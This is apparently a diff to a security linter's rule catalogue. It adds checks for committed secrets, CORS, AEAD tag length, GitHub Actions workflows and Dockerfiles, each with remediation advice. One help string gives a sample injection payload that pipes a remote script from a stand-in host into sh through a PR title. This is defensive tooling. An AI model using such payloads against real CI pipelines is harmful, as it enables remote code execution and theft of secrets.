@@ -11,7 +11,7 @@ export interface RuleMeta {
   severity: Severity;
   cwe: string[];
   help: string;
-  languages: ("javascript" | "python" | "any")[];
+  languages: ("javascript" | "python" | "github-actions" | "dockerfile" | "any")[];
   /** Defaults to "security". Quality rules don't fail the build unless --fail-on-quality is set. */
   category?: "quality";
 }
@@ -38,8 +38,32 @@ const RULE_LIST: RuleMeta[] = [
     title: "Hardcoded password or secret",
     severity: "medium",
     cwe: ["CWE-798"],
-    help: "Read the value from configuration or a secret manager instead of the source code.",
-    languages: ["javascript", "python"],
+    help: "Read the value from configuration or a secret manager instead of the source code. If it was ever pushed, rotate it.",
+    languages: ["any"],
+  },
+  {
+    id: "secret/jwt",
+    title: "JSON Web Token committed to the repository",
+    severity: "high",
+    cwe: ["CWE-798"],
+    help: "A JWT is a bearer credential: anyone holding it acts as its subject until it expires. Revoke the session/key that signed it and load tokens at runtime.",
+    languages: ["any"],
+  },
+  {
+    id: "secret/auth-header",
+    title: "Credentials in an Authorization header",
+    severity: "high",
+    cwe: ["CWE-798"],
+    help: "Replace the token with a variable (e.g. $TOKEN) in scripts and docs, and rotate the credential if it was real.",
+    languages: ["any"],
+  },
+  {
+    id: "secret/env-file",
+    title: ".env file with real values committed",
+    severity: "high",
+    cwe: ["CWE-538", "CWE-798"],
+    help: "Remove the file from git (git rm --cached), add it to .gitignore, commit a .env.example with placeholders instead, and rotate every credential it contained.",
+    languages: ["any"],
   },
   {
     id: "js/sql-injection",
@@ -327,6 +351,87 @@ const RULE_LIST: RuleMeta[] = [
     cwe: ["CWE-1069"],
     help: "Catch the specific exception you expect and log it, or explain in a comment why ignoring it is safe.",
     languages: ["python"],
+    category: "quality",
+  },
+  {
+    id: "js/cors-any-origin",
+    title: "CORS allows any origin",
+    severity: "medium",
+    cwe: ["CWE-942"],
+    help: "List the origins that may call the API (origin: [\"https://app.example.com\"]). Reflecting any origin together with credentials: true lets any website make authenticated requests as the user.",
+    languages: ["javascript"],
+  },
+  {
+    id: "js/gcm-no-tag-length",
+    title: "AEAD decryption without a fixed tag length",
+    severity: "medium",
+    cwe: ["CWE-354"],
+    help: "Pass { authTagLength: 16 } to createDecipheriv: without it Node accepts truncated authentication tags, which makes forging ciphertexts much easier.",
+    languages: ["javascript"],
+  },
+  {
+    id: "gha/script-injection",
+    title: "Untrusted input interpolated into a workflow script",
+    severity: "medium",
+    cwe: ["CWE-78", "CWE-94"],
+    help: "${{ }} is pasted into the script before it runs, so a PR title or branch name like `\"; curl evil.sh | sh #` becomes code. Pass the value through env: (VAR: ${{ github.event.pull_request.title }}) and use \"$VAR\" in the script.",
+    languages: ["github-actions"],
+  },
+  {
+    id: "gha/untrusted-checkout",
+    title: "pull_request_target checks out the PR's code",
+    severity: "critical",
+    cwe: ["CWE-829"],
+    help: "pull_request_target runs with secrets and a write token; checking out the fork's head and running its build gives that code your secrets. Use pull_request, or split into an unprivileged build and a privileged workflow_run.",
+    languages: ["github-actions"],
+  },
+  {
+    id: "gha/unpinned-action",
+    title: "Third-party action not pinned to a commit",
+    severity: "medium",
+    cwe: ["CWE-829"],
+    help: "Tags can be moved by the action's owner (or whoever compromises it). Pin to the full commit SHA and keep the tag as a comment: uses: owner/action@<40-char sha> # v2.1.0. Dependabot can keep pins updated.",
+    languages: ["github-actions"],
+  },
+  {
+    id: "gha/excessive-permissions",
+    title: "Workflow token with write-all permissions",
+    severity: "medium",
+    cwe: ["CWE-250"],
+    help: "Grant only what the job needs, e.g. permissions: { contents: read, pull-requests: write }.",
+    languages: ["github-actions"],
+  },
+  {
+    id: "docker/root-user",
+    title: "Container runs as root",
+    severity: "medium",
+    cwe: ["CWE-250"],
+    help: "Add a USER instruction with an unprivileged user in the final stage (or use a nonroot/distroless base image) so a compromised process doesn't get root in the container.",
+    languages: ["dockerfile"],
+  },
+  {
+    id: "docker/curl-pipe-shell",
+    title: "Remote script piped into a shell during the build",
+    severity: "medium",
+    cwe: ["CWE-494"],
+    help: "Download the script, verify its checksum or signature, then run it; or install from a package manager.",
+    languages: ["dockerfile"],
+  },
+  {
+    id: "docker/add-remote",
+    title: "ADD downloads a remote file without a checksum",
+    severity: "medium",
+    cwe: ["CWE-494"],
+    help: "Use ADD --checksum=sha256:... or download with curl and verify the hash before using the file.",
+    languages: ["dockerfile"],
+  },
+  {
+    id: "docker/latest-tag",
+    title: "Base image without a pinned version",
+    severity: "low",
+    cwe: ["CWE-1357"],
+    help: "Pin a version (node:22.11-slim) or a digest (@sha256:...) so builds are reproducible and an upstream change can't slip into production unnoticed.",
+    languages: ["dockerfile"],
     category: "quality",
   },
 ];
